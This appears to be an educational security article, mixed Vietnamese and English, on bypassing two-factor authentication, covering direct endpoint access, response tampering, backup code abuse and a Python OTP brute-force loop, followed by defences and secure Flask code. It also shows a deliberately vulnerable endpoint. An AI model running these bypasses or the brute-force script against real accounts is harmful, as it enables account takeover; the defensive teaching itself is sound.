# 2FA/MFA Bypass

> **OWASP Top 10:2025**: A07:2025 – Authentication Failures | **CWE**: CWE-308 | **Nguồn**: PortSwigger, OWASP, CWE MITRE

## 🧱 Kiến thức Nền tảng

Two-Factor Authentication (2FA) hay Multi-Factor Authentication (MFA) yêu cầu user cung cấp ít nhất hai yếu tố xác thực từ các nhóm khác nhau: **Something you know** (mật khẩu), **Something you have** (điện thoại, hardware key), và **Something you are** (vân tay, khuôn mặt).

Luồng 2FA phổ biến nhất là TOTP (Time-based One-Time Password) qua ứng dụng Authenticator, hoặc OTP gửi qua SMS/email:

```python
# Normal 2FA verification flow
@app.route('/login', methods=['POST'])
def login():
    user = authenticate(request.form['username'], request.form['password'])
    if user:
        # Step 1: Password correct — generate and send OTP
        otp = generate_otp(length=6)
        store_otp(user.id, otp, ttl=300)  # Valid for 5 minutes
        send_sms(user.phone, f"Your code: {otp}")
        
        # Store partial session (NOT fully authenticated yet)
        session['pending_2fa_user'] = user.id
        session['2fa_verified'] = False
        return redirect('/verify-2fa')
    
    return "Invalid credentials", 401

@app.route('/verify-2fa', methods=['POST'])
def verify_2fa():
    user_id = session.get('pending_2fa_user')
    submitted_otp = request.form['otp']
    
    if verify_otp(user_id, submitted_otp):
        session['2fa_verified'] = True
        session['authenticated_user'] = user_id
        return redirect('/dashboard')
    
    return "Invalid OTP", 401
```

Lý thuyết thì 2FA tăng bảo mật đáng kể, nhưng trong thực tế, nhiều implementation có lỗi cho phép attacker bypass hoàn toàn bước xác thực thứ hai.

## 🔍 Mô tả lỗ hổng

2FA bypass xảy ra khi ứng dụng không enforce đúng bước xác thực thứ hai: cho phép truy cập trực tiếp endpoint sau khi đăng nhập mà không kiểm tra OTP, không giới hạn số lần nhập OTP (brute-force), response manipulation để đánh lừa client, hoặc lạm dụng backup codes không được bảo vệ đúng cách.

## ⚔️ Cơ chế tấn công

**1. Direct Endpoint Access — bỏ qua trang nhập OTP:**

```http
// After entering correct password, attacker skips /verify-2fa
// and navigates directly to:
GET /dashboard HTTP/1.1
Cookie: session=abc123

// If server only checks password session but not 2fa_verified flag,
// attacker gains full access without OTP
```

**2. Response Manipulation — sửa response trong proxy:**

```http
// Attacker submits wrong OTP, server responds:
HTTP/1.1 401 Unauthorized
{"success": false, "message": "Invalid OTP"}

// Attacker intercepts with Burp Suite and modifies to:
HTTP/1.1 200 OK
{"success": true, "message": "OTP verified"}

// If client-side logic trusts the response without server-side enforcement
```

**3. OTP Brute Force — thử tất cả tổ hợp:**

```python
import requests

# 6-digit OTP has 1,000,000 combinations
# Without rate limiting, brute force is feasible
session = requests.Session()
session.cookies.set('session', 'victim_session_cookie')

for otp in range(0, 1000000):
    code = str(otp).zfill(6)
    resp = session.post('https://target.com/verify-2fa', data={'otp': code})
    
    if 'dashboard' in resp.url or resp.status_code == 200:
        print(f"Valid OTP found: {code}")
        break
    
    # Some apps reset OTP after N attempts — attacker triggers new OTP
```

**4. Backup Code Abuse:**

```http
// Backup codes are often 8-digit static codes
// If not rate-limited and not invalidated after use:
POST /verify-2fa HTTP/1.1
{"method": "backup_code", "code": "12345678"}
// Attacker brute-forces backup codes instead of TOTP
```

## 🛡️ Biện pháp phòng thủ

1. **Server-side 2FA enforcement**: Kiểm tra `2fa_verified` flag ở **mọi** protected endpoint, không chỉ ở trang OTP.
2. **Rate limiting**: Giới hạn 3-5 lần thử OTP, sau đó lock tài khoản hoặc yêu cầu đợi 15 phút.
3. **OTP expiration**: OTP chỉ hợp lệ trong 5 phút và bị vô hiệu hóa sau khi dùng hoặc khi OTP mới được tạo.
4. **Backup code controls**: Hash backup codes, chỉ cho sử dụng một lần, giới hạn tổng số backup codes.

## 💻 Code Example

```python
# VULNERABLE: no 2FA check on protected endpoints
@app.route('/dashboard')
@login_required  # Only checks password authentication
def dashboard():
    # Missing: does not verify session['2fa_verified']
    return render_template('dashboard.html', user=current_user)
```

```python
# SECURE: strict 2FA enforcement with rate limiting
from functools import wraps

def require_full_auth(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        # Check BOTH password auth AND 2FA verification
        if not session.get('authenticated_user'):
            return redirect('/login')
        if not session.get('2fa_verified'):
            return redirect('/verify-2fa')
        return f(*args, **kwargs)
    return decorated

@app.route('/verify-2fa', methods=['POST'])
@limiter.limit("5 per 15 minutes")  # Rate limit OTP attempts
def verify_2fa():
    user_id = session.get('pending_2fa_user')
    if not user_id:
        return redirect('/login')
    
    attempts = get_otp_attempts(user_id)
    if attempts >= 5:
        invalidate_otp(user_id)  # Force new OTP generation
        return jsonify({"error": "Too many attempts, new code sent"}), 429
    
    if verify_otp(user_id, request.form['otp']):
        session['2fa_verified'] = True
        session['authenticated_user'] = user_id
        clear_otp_attempts(user_id)
        return redirect('/dashboard')
    
    increment_otp_attempts(user_id)
    return jsonify({"error": "Invalid code"}), 401

@app.route('/dashboard')
@require_full_auth  # Enforces both password + 2FA
def dashboard():
    return render_template('dashboard.html', user=current_user)
```

## 📚 Nguồn tham khảo
- PortSwigger: https://portswigger.net/web-security/authentication/multi-factor
- OWASP: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/11-Testing_Multi-Factor_Authentication
- CWE: https://cwe.mitre.org/data/definitions/308.html
